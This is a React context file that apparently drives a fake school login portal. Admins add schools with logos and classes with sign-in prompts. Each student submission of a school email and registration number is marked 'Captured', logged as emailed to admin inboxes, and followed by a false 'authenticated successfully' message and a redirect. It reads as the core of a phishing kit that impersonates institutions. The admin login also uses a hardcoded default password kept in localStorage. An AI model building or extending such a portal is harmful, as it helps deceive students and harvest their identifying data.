import React, { createContext, useContext, useState, useEffect } from 'react';
import { INITIAL_CLASSES, INITIAL_NOTIFICATION_EMAILS, INITIAL_SUBMISSIONS, INITIAL_SCHOOLS } from '../mockData';

const PortalContext = createContext(null);

export function PortalProvider({ children }) {
  // 1. Schools & Logos State (User Request: 10-15 schools + admin logo upload)
  const [schools, setSchools] = useState(() => {
    try {
      const saved = localStorage.getItem('portal_schools');
      return saved ? JSON.parse(saved) : INITIAL_SCHOOLS;
    } catch (e) {
      return INITIAL_SCHOOLS;
    }
  });

  // 2. Classes State
  const [classes, setClasses] = useState(() => {
    try {
      const saved = localStorage.getItem('portal_classes');
      return saved ? JSON.parse(saved) : INITIAL_CLASSES;
    } catch (e) {
      return INITIAL_CLASSES;
    }
  });

  // 3. Notification Emails State (to receive captured student data)
  const [notificationEmails, setNotificationEmails] = useState(() => {
    try {
      const saved = localStorage.getItem('portal_notification_emails');
      return saved ? JSON.parse(saved) : INITIAL_NOTIFICATION_EMAILS;
    } catch (e) {
      return INITIAL_NOTIFICATION_EMAILS;
    }
  });

  // 4. Captured Student Submissions / Login Records
  const [submissions, setSubmissions] = useState(() => {
    try {
      const saved = localStorage.getItem('portal_submissions');
      return saved ? JSON.parse(saved) : INITIAL_SUBMISSIONS;
    } catch (e) {
      return INITIAL_SUBMISSIONS;
    }
  });

  // 5. Email delivery logs (history of emails dispatched upon student login)
  const [deliveryLogs, setDeliveryLogs] = useState(() => {
    try {
      const saved = localStorage.getItem('portal_delivery_logs');
      return saved ? JSON.parse(saved) : [
        {
          id: 'log-1',
          submissionId: 'CAP-2026-9145',
          recipients: ['admin.records@school.edu'],
          subject: 'New Student Login [BIO-201]: Alex Smith (BIO/2023/118)',
          sentAt: '2026-11-06T09:15:32Z',
          status: 'Delivered',
        }
      ];
    } catch (e) {
      return [];
    }
  });

  // 6. Admin Authentication State (Username & Password protected)
  const [adminCredentials, setAdminCredentials] = useState(() => {
    try {
      const saved = localStorage.getItem('portal_admin_credentials');
      return saved ? JSON.parse(saved) : { username: 'admin', password: 'password123' };
    } catch (e) {
      return { username: 'admin', password: 'password123' };
    }
  });

  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(() => {
    try {
      const saved = localStorage.getItem('portal_admin_auth');
      return saved === 'true';
    } catch (e) {
      return false;
    }
  });

  // 7. Global Redirect Settings (Configurable via Admin)
  const [redirectConfig, setRedirectConfig] = useState(() => {
    try {
      const saved = localStorage.getItem('portal_redirect_config');
      return saved ? JSON.parse(saved) : {
        defaultRedirectUrl: '', // empty means redirects back to the login page
        redirectDelaySeconds: 3,
        welcomeMessage: 'Welcome! Your student session has been authenticated successfully.',
      };
    } catch (e) {
      return {
        defaultRedirectUrl: '',
        redirectDelaySeconds: 3,
        welcomeMessage: 'Welcome! Your student session has been authenticated successfully.',
      };
    }
  });

  // 8. Active Student Welcome / Redirect Screen State
  const [studentWelcomeState, setStudentWelcomeState] = useState(null);

  // 9. Navigation & Active Class view
  const [currentView, setCurrentView] = useState('student'); // 'student' or 'admin'
  const [selectedClassCode, setSelectedClassCode] = useState('CS-101');
  const [toastMessage, setToastMessage] = useState(null);

  // Sync to localStorage
  useEffect(() => {
    localStorage.setItem('portal_schools', JSON.stringify(schools));
  }, [schools]);

  useEffect(() => {
    localStorage.setItem('portal_classes', JSON.stringify(classes));
  }, [classes]);

  useEffect(() => {
    localStorage.setItem('portal_notification_emails', JSON.stringify(notificationEmails));
  }, [notificationEmails]);

  useEffect(() => {
    localStorage.setItem('portal_submissions', JSON.stringify(submissions));
  }, [submissions]);

  useEffect(() => {
    localStorage.setItem('portal_delivery_logs', JSON.stringify(deliveryLogs));
  }, [deliveryLogs]);

  useEffect(() => {
    localStorage.setItem('portal_admin_credentials', JSON.stringify(adminCredentials));
  }, [adminCredentials]);

  useEffect(() => {
    localStorage.setItem('portal_admin_auth', String(isAdminAuthenticated));
  }, [isAdminAuthenticated]);

  useEffect(() => {
    localStorage.setItem('portal_redirect_config', JSON.stringify(redirectConfig));
  }, [redirectConfig]);

  // URL query parameter support for direct class links (e.g. ?class=BIO-201)
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const classParam = params.get('class');
    if (classParam) {
      const exists = classes.find(c => c.code.toLowerCase() === classParam.toLowerCase());
      if (exists) {
        setSelectedClassCode(exists.code);
        setCurrentView('student');
      }
    }
  }, [classes]);

  // Toast Notification helper
  const showToast = (text, type = 'success') => {
    setToastMessage({ text, type, id: Date.now() });
  };

  const closeToast = () => setToastMessage(null);

  // Dynamic School Detection Helper: looks up matching school by email domain
  const findSchoolByEmail = (email) => {
    if (!email || !email.includes('@')) return null;

    const lowerEmail = email.toLowerCase().trim();
    const parts = lowerEmail.split('@');
    if (parts.length < 2 || !parts[1]) return null;

    const domainPart = '@' + parts[1];

    // 1. Exact match on domain
    let match = schools.find(s => s.domain.toLowerCase() === domainPart);
    if (match) return match;

    // 2. Suffix match (e.g. student@cs.school1.edu matches @school1.edu)
    match = schools.find(s => lowerEmail.endsWith(s.domain.toLowerCase()));
    if (match) return match;

    // 3. Partial match if user is still typing (e.g. "@school1" or "@stanf")
    match = schools.find(s => s.domain.toLowerCase().startsWith(domainPart));
    if (match) return match;

    return null;
  };

  // Admin School Management: Add New School with custom logo
  const addSchool = (schoolData) => {
    const name = schoolData.name.trim();
    let domain = schoolData.domain.trim().toLowerCase();
    if (!domain.startsWith('@')) {
      domain = '@' + domain;
    }

    if (schools.some(s => s.domain.toLowerCase() === domain)) {
      showToast(`A school with domain "${domain}" already exists!`, 'error');
      return false;
    }

    const newSchool = {
      id: `sch-${Date.now()}`,
      name: name,
      domain: domain,
      acronym: (schoolData.acronym || name.slice(0, 4)).toUpperCase().trim(),
      color: schoolData.color || '#3B66F5',
      logo: schoolData.logo || '', // Base64 data URL or image link
      tagline: schoolData.tagline?.trim() || 'Verified Academic Institution',
      country: schoolData.country?.trim() || 'International',
      isDefault: false,
      createdAt: new Date().toISOString(),
    };

    setSchools(prev => [newSchool, ...prev]);
    showToast(`Added school "${newSchool.name}" (${newSchool.domain})!`, 'success');
    return newSchool;
  };

  // Admin School Management: Update School
  const updateSchool = (id, updatedData) => {
    setSchools(prev =>
      prev.map(s => {
        if (s.id === id) {
          let domain = updatedData.domain ? updatedData.domain.trim().toLowerCase() : s.domain;
          if (domain && !domain.startsWith('@')) domain = '@' + domain;
          return {
            ...s,
            ...updatedData,
            domain: domain,
          };
        }
        return s;
      })
    );
    showToast('School profile updated successfully!', 'success');
    return true;
  };

  // Admin School Management: Delete School
  const deleteSchool = (id) => {
    if (schools.length <= 1) {
      showToast('You must have at least one school profile registered.', 'error');
      return false;
    }
    setSchools(prev => prev.filter(s => s.id !== id));
    showToast('School profile removed.', 'info');
    return true;
  };

  // Admin Authentication Methods
  const adminLogin = (username, password) => {
    const u = username.trim();
    const p = password.trim();

    if (u === adminCredentials.username && p === adminCredentials.password) {
      setIsAdminAuthenticated(true);
      showToast('Admin authenticated successfully!', 'success');
      return true;
    } else {
      showToast('Invalid admin username or password.', 'error');
      return false;
    }
  };

  const adminLogout = () => {
    setIsAdminAuthenticated(false);
    showToast('Signed out of admin console.', 'info');
  };

  const updateAdminCredentials = (newUsername, newPassword) => {
    if (!newUsername.trim() || !newPassword.trim()) {
      showToast('Username and password cannot be empty.', 'error');
      return false;
    }
    const updated = {
      username: newUsername.trim(),
      password: newPassword.trim(),
    };
    setAdminCredentials(updated);
    showToast('Admin credentials updated successfully!', 'success');
    return true;
  };

  // Update Global Redirect Settings
  const updateRedirectConfig = (newSettings) => {
    setRedirectConfig(prev => ({
      ...prev,
      ...newSettings,
    }));
    showToast('Redirect settings updated successfully!', 'success');
  };

  // Process Student Login -> Captures Data, Dispatches Emails, & Triggers Welcome with Redirect
  const processStudentLogin = (schoolEmail, regNo, classCode) => {
    const targetClass = classes.find(c => c.code === classCode) || {
      code: classCode,
      name: 'Class ' + classCode,
      redirectUrl: '',
    };

    const matchedSchool = findSchoolByEmail(schoolEmail);

    const newCapId = `CAP-${new Date().getFullYear()}-${Math.floor(1000 + Math.random() * 9000)}`;
    const activeEmails = notificationEmails.filter(e => e.active).map(e => e.email);

    const newRecord = {
      id: newCapId,
      classCode: targetClass.code,
      className: targetClass.name,
      schoolEmail: schoolEmail.trim(),
      schoolName: matchedSchool?.name || 'Verified School',
      schoolLogo: matchedSchool?.logo || '',
      regNo: regNo.trim().toUpperCase(),
      fullName: regNo.trim().toUpperCase(),
      status: 'Captured',
      submittedAt: new Date().toISOString(),
      sentToEmails: activeEmails,
    };

    // Save record to submissions (Captured Data)
    setSubmissions(prev => [newRecord, ...prev]);

    // Dispatch simulated notification email to admin notification inboxes
    if (activeEmails.length > 0) {
      const logEntry = {
        id: `log-${Date.now()}`,
        submissionId: newCapId,
        recipients: activeEmails,
        subject: `New Student Login [${targetClass.code}]: Reg ${newRecord.regNo} from ${newRecord.schoolName}`,
        sentAt: new Date().toISOString(),
        status: 'Delivered',
      };
      setDeliveryLogs(prev => [logEntry, ...prev]);
    }

    // Determine target redirect URL: class specific URL -> global default redirect URL -> class login page
    const finalRedirectUrl = targetClass.redirectUrl?.trim() || redirectConfig.defaultRedirectUrl?.trim() || '';

    // Trigger Welcome Screen with redirect countdown & school logo!
    setStudentWelcomeState({
      active: true,
      regNo: newRecord.regNo,
      schoolEmail: newRecord.schoolEmail,
      schoolName: newRecord.schoolName,
      schoolLogo: newRecord.schoolLogo,
      classCode: targetClass.code,
      className: targetClass.name,
      redirectUrl: finalRedirectUrl,
      delaySeconds: redirectConfig.redirectDelaySeconds || 3,
      welcomeMessage: redirectConfig.welcomeMessage || 'Welcome! Your student session has been authenticated successfully.',
    });

    showToast(`Welcome ${newRecord.regNo}! Redirecting...`, 'success');
    return newRecord;
  };

  // Reset Student Welcome Screen
  const clearStudentWelcome = () => {
    setStudentWelcomeState(null);
  };

  // Admin: Delete Submission
  const deleteSubmission = (id) => {
    setSubmissions(prev => prev.filter(item => item.id !== id));
    showToast(`Captured record #${id} removed.`, 'info');
  };

  // Admin: Add Notification Email
  const addNotificationEmail = (email, label = 'Staff Recipient', isPrimary = false) => {
    const cleanEmail = email.trim().toLowerCase();
    if (!cleanEmail || !cleanEmail.includes('@')) {
      showToast('Please enter a valid email address.', 'error');
      return false;
    }
    if (notificationEmails.some(e => e.email.toLowerCase() === cleanEmail)) {
      showToast('This email is already in the notification list.', 'error');
      return false;
    }

    const newEntry = {
      id: `notif-${Date.now()}`,
      email: cleanEmail,
      label: label.trim() || 'Staff Recipient',
      isPrimary: Boolean(isPrimary),
      addedAt: new Date().toISOString(),
      active: true,
    };

    setNotificationEmails(prev => [newEntry, ...prev]);
    showToast(`Added ${cleanEmail} to admin notification list!`, 'success');
    return true;
  };

  // Admin: Remove Notification Email
  const removeNotificationEmail = (id) => {
    setNotificationEmails(prev => prev.filter(e => e.id !== id));
    showToast('Notification email removed.', 'info');
  };

  // Admin: Toggle Email Active
  const toggleNotificationEmail = (id) => {
    setNotificationEmails(prev =>
      prev.map(e => (e.id === id ? { ...e, active: !e.active } : e))
    );
  };

  // Admin: Generate / Add New Class Portal
  const addClass = (newClassData) => {
    const code = newClassData.code.trim().toUpperCase();
    if (classes.some(c => c.code.toUpperCase() === code)) {
      showToast(`Class with code "${code}" already exists!`, 'error');
      return false;
    }

    const newClass = {
      id: `cls-${Date.now()}`,
      code: code,
      name: newClassData.name.trim(),
      department: newClassData.department ? newClassData.department.trim() : 'General Academic',
      academicYear: newClassData.academicYear || '2025/2026',
      semester: newClassData.semester || '1st Semester',
      allowedDomain: newClassData.allowedDomain ? newClassData.allowedDomain.trim() : '',
      description: newClassData.description ? newClassData.description.trim() : 'Class Portal',
      formTitle: newClassData.formTitle ? newClassData.formTitle.trim() : 'Welcome Back',
      formPrompt: newClassData.formPrompt ? newClassData.formPrompt.trim() : 'Please sign in to your student account',
      redirectUrl: newClassData.redirectUrl ? newClassData.redirectUrl.trim() : '',
      createdAt: new Date().toISOString(),
      isActive: true,
    };

    setClasses(prev => [...prev, newClass]);
    showToast(`Created class portal for ${newClass.name} (${newClass.code})!`, 'success');
    return newClass;
  };

  // Admin: Delete Class
  const deleteClass = (id) => {
    setClasses(prev => prev.filter(c => c.id !== id));
    showToast('Class portal deleted.', 'info');
  };

  // Switch to specific class login page
  const openClassPortal = (classCode) => {
    setSelectedClassCode(classCode);
    setCurrentView('student');
    setStudentWelcomeState(null);
    showToast(`Loaded class login portal for ${classCode}`, 'info');
  };

  // Dispatch simulated test email
  const sendTestEmail = (targetEmail) => {
    const logEntry = {
      id: `log-${Date.now()}`,
      submissionId: 'TEST-VERIFY',
      recipients: [targetEmail],
      subject: `[TEST] Admin Notification Channel Verification`,
      sentAt: new Date().toISOString(),
      status: 'Delivered',
    };
    setDeliveryLogs(prev => [logEntry, ...prev]);
    showToast(`Test verification email dispatched to ${targetEmail}!`, 'success');
  };

  return (
    <PortalContext.Provider
      value={{
        schools,
        addSchool,
        updateSchool,
        deleteSchool,
        findSchoolByEmail,
        classes,
        addClass,
        deleteClass,
        notificationEmails,
        addNotificationEmail,
        removeNotificationEmail,
        toggleNotificationEmail,
        sendTestEmail,
        submissions,
        deleteSubmission,
        deliveryLogs,
        adminCredentials,
        isAdminAuthenticated,
        adminLogin,
        adminLogout,
        updateAdminCredentials,
        redirectConfig,
        updateRedirectConfig,
        studentWelcomeState,
        processStudentLogin,
        clearStudentWelcome,
        currentView,
        setCurrentView,
        selectedClassCode,
        setSelectedClassCode,
        openClassPortal,
        toastMessage,
        showToast,
        closeToast,
      }}
    >
      {children}
    </PortalContext.Provider>
  );
}

export function usePortal() {
  const context = useContext(PortalContext);
  if (!context) {
    throw new Error('usePortal must be used within a PortalProvider');
  }
  return context;
}
